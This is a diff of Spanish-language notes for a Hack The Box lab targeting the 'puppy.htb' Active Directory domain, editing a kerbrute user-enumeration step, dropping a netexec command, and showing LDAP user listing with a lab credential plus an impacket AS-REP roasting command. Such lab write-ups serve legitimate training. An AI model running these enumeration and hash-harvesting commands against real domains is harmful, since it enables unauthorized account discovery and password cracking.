@@ -60,6 +60,9 @@ Nos enumerara los usuarios del dominio
 Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
 `nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
 
+Para verificar y enumerar que existan en el dominio con la herramienta [[KERBRUTE]]
+`kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
+
 ```ad-hint    
 Administrator    
 Guest            
@@ -72,11 +75,8 @@ steph.cooper
 steph.cooper_adm 
 ```
 
-Enumeración de usuarios y verificar que exista en el dominio con la herramienta [[KERBRUTE]]
-`kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames`
 
- O también podemos usar [[CRACKMAPEXEC-NETEXEC]] para enumerar usuarios
- `netexec ldap $IP -u users.txt -p '' -k`
+
 
  ```ad-note
    El error KDC_ERR_PREAUTH_FAILED la contraseña no funciona pero existe el usuario
@@ -86,7 +86,7 @@ Enumeración de usuarios y verificar que exista en el dominio con la herramienta
 
 
 ```ad-info
-### Verificacion de firerentes vectores de ataque
+### Verificacion de diferentes vectores de ataque
 #### AS-REP ROASTING (Sin creds)
 Busca obtener _hashes_ de contraseñas de usuarios que tengan deshabilitada la **preautenticación Kerberos**
 `impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
